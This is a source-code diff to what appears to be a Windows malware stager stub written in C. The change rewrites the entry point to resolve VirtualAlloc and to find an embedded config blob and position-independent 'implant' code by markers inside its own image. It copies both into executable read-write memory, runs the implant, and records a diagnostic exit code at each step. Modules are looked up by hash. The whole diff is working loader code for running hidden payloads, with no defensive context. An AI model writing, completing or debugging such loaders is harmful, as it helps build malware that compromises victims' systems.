@@ -43,11 +43,61 @@ static volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + PIC_MAX_CA
 
 __attribute__((ms_abi))
 void WinMainCRTStartup(void) {
-    stub_execute_payload();
+    /* Inline the payload execution with granular exit codes,
+       since stub_execute_payload's STUB_FAIL may not propagate. */
+    g_stub_exit_code = 200; /* reached entry */
 
-    /* Exit with diagnostic code. 0 = PIC ran and returned, 100+ = stub failure */
+    fn_VirtualAlloc pVA = stub_resolve_virtualalloc();
+    if (!pVA) { g_stub_exit_code = 100; goto done; }
+    g_stub_exit_code = 201;
+
+    PVOID img_base = stub_get_image_base();
+    if (!img_base) { g_stub_exit_code = 101; goto done; }
+    g_stub_exit_code = 202;
+
+    SIZE_T img_size = stub_get_image_size(img_base);
+    if (img_size == 0) { g_stub_exit_code = 102; goto done; }
+    g_stub_exit_code = 203;
+
+    PBYTE b = (PBYTE)img_base;
+
+    PBYTE cp = stub_find_marker_in_image(b, img_size, CONFIG_MARKER, CONFIG_MARKER_LEN);
+    if (!cp) { g_stub_exit_code = 103; goto done; }
+    g_stub_exit_code = 204;
+
+    DWORD cfg_max = *(DWORD *)cp;
+    PBYTE cfg_data = cp + sizeof(DWORD);
+    DWORD cfg_len = *(DWORD *)cfg_data;
+    PBYTE cfg_blob = cfg_data + sizeof(DWORD);
+    if (cfg_len == 0 || cfg_len > cfg_max) { g_stub_exit_code = 104; goto done; }
+    g_stub_exit_code = 205;
+
+    PBYTE pp = stub_find_marker_in_image(b, img_size, PIC_MARKER, PIC_MARKER_LEN);
+    if (!pp) { g_stub_exit_code = 105; goto done; }
+    g_stub_exit_code = 206;
+
+    DWORD pic_sz = *(DWORD *)pp;
+    PBYTE pic_dat = pp + sizeof(DWORD);
+    if (pic_sz == 0) { g_stub_exit_code = 106; goto done; }
+    g_stub_exit_code = 207;
+
+    SIZE_T alloc_sz = (SIZE_T)pic_sz + sizeof(DWORD) + (SIZE_T)cfg_len;
+    PVOID exec = pVA(NULL, alloc_sz, 0x3000, 0x40); /* MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE */
+    if (!exec) { g_stub_exit_code = 107; goto done; }
+    g_stub_exit_code = 208;
+
+    stub_memcpy(exec, pic_dat, pic_sz);
+    PBYTE cdst = (PBYTE)exec + pic_sz;
+    *(DWORD *)cdst = cfg_len;
+    stub_memcpy(cdst + sizeof(DWORD), cfg_blob, cfg_len);
+    g_stub_exit_code = 209;
+
+    fn_implant_entry entry = (fn_implant_entry)exec;
+    entry(NULL);
+    g_stub_exit_code = 99; /* PIC returned */
+
+done:;
     DWORD code = g_stub_exit_code;
-    if (code == 0) code = 99; /* 99 = PIC entry returned normally */
 
     PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
     if (k32) {
